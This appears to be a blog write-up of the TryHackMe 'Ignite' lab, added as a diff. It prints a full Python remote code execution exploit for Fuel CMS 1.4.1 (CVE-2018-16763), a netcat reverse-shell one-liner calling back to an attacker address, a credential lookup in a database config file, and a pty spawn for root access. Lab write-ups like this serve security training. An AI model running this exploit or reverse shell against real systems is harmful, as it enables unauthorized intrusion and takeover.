@@ -1,0 +1,78 @@
+I"4<p>Room: <a href="https://tryhackme.com/room/ignite">tryhackme.com/room/ignite</a></p>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p><img src="/images/ignite00.jpg" alt="nmap" /></p>
+
+<p>nmap scan show it has webserver running</p>
+
+<p><img src="/images/ignite01.jpg" alt="fuel" />
+lets find exploit for fuel cms version 1.4</p>
+
+<hr />
+<h2 id="gain-access">Gain access</h2>
+
+<p><img src="/images/ignite02.jpg" alt="searchsploit" /></p>
+
+<p><a href="https://www.exploit-db.com/exploits/47138">https://www.exploit-db.com/exploits/47138</a></p>
+
+<p>python2 is dead so i change it to python3
+here the code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
+# Date: 2019-07-19
+# Exploit Author: 0xd0ff9
+# Vendor Homepage: https://www.getfuelcms.com/
+# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
+# Version: &lt;= 1.4.1
+# Tested on: Ubuntu - Apache2 - php5
+# CVE : CVE-2018-16763
+</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://10.10.32.4"</span>
+<span class="k">def</span> <span class="nf">find_nth_overlapping</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="n">needle</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="n">start</span> <span class="o">=</span> <span class="n">haystack</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">needle</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">start</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">n</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">start</span> <span class="o">=</span> <span class="n">haystack</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">needle</span><span class="p">,</span> <span class="n">start</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">n</span> <span class="o">-=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">start</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+	<span class="n">xxxx</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'cmd:'</span><span class="p">)</span>
+	<span class="n">burp0_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="s">"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"</span><span class="o">+</span><span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote</span><span class="p">(</span><span class="n">xxxx</span><span class="p">)</span><span class="o">+</span><span class="s">"%27%29%2b%27"</span>
+	<span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span><span class="s">"http"</span><span class="p">:</span><span class="s">"http://10.10.3"</span><span class="p">}</span>
+	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">)</span><span class="c1">#, proxies=proxy)
+</span>
+	<span class="n">html</span> <span class="o">=</span> <span class="s">"&lt;!DOCTYPE html&gt;"</span>
+	<span class="n">htmlcharset</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
+
+	<span class="n">begin</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">20</span><span class="p">]</span>
+	<span class="n">dup</span> <span class="o">=</span> <span class="n">find_nth_overlapping</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span><span class="n">begin</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
+
+	<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">dup</span><span class="p">])</span>
+</code></pre></div></div>
+<p>lets bind reverse shell</p>
+
+<p>Reference: [<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey.net</a>]</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.4.58.14 4444&gt;/tmp/f
+</code></pre></div></div>
+
+<p><img src="/images/ignite03.jpg" alt="revshell" /></p>
+
+<p>flag 1 is user.txt so is located on user directory</p>
+
+<h2 id="privsec">PrivSec</h2>
+
+<p>I need to gain root privilege to get root.txt
+the webpage said the database is located on <code class="language-plaintext highlighter-rouge">fuel/application/config/database.php</code>. I dig into it to findroot credentials.</p>
+
+<p><img src="/images/ignite04.jpg" alt="database" /></p>
+
+<p>because you can change user in this shell. I need to change it.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<p>Aaaaand i found the last flag. :D</p>
+:ET
